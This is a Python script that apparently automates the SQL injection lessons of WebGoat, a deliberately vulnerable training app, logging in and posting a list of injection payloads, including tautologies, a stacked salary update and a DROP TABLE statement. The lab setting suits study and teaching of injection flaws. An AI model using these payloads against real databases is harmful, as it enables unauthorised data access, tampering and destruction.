import requests

# Define placeholders
HOST_IP = "__HOST_IP__"
USERNAME = "__USERNAME__"
PASSWORD = "__PASSWORD__"
BASE_URL = "http://__HOST_IP__:8080/WebGoat"

s = requests.Session()

s.headers.update(
    {
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "sq-AL,sq;q=0.9,en-US;q=0.8,en;q=0.7",
        "Cache-Control": "max-age=0",
        "Connection": "keep-alive",
        "Host": f"{HOST_IP}:8080",
        "Origin": BASE_URL,
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    }
)

# Login
s.post(
    f"{BASE_URL}/login",
    data={"username": USERNAME, "password": PASSWORD},
)

# Load necessary resources
for url in [
    "welcome.mvc",
    "start.mvc",
    "service/labels.mvc",
    "service/lessonmenu.mvc",
    "service/lessonoverview.mvc",
    "WebGoatIntroduction.lesson.lesson",
    "SqlInjection.lesson.lesson",
]:
    s.get(f"{BASE_URL}/{url}")

# SQL Injection Attacks
attacks = [
    ("attack2", {"query": "SELECT department FROM employees WHERE first_name='Bob'"}),
    ("attack3", {"query": "UPDATE employees SET department='Sales' WHERE first_name='Tobi'"}),
    ("attack4", {"query": "ALTER TABLE employees ADD phone varchar(20)"}),
    ("attack5", {"query": "GRANT ALTER TABLE TO UnauthorizedUser"}),
    ("assignment5a", {"account": "Smith'", "operator": "or", "injection": "'1' = '1"}),
    ("assignment5b", {"login_count": "0", "userid": "0 OR 1=1"}),
    ("attack8", {"name": "A", "auth_tan": "' OR '1'='1"}),
    ("attack9", {"name": "A", "auth_tan": "'; UPDATE employees SET salary=99999 WHERE first_name='John"}),
    ("attack10", {"action_string": "%'; DROP TABLE access_log;--"}),
]

for attack, data in attacks:
    r = s.post(f"{BASE_URL}/SqlInjection/{attack}", data=data)
    print(f"Endpoint: {BASE_URL}/SqlInjection/{attack}\nStatus code: {r.status_code}\nText received: {r.text}")
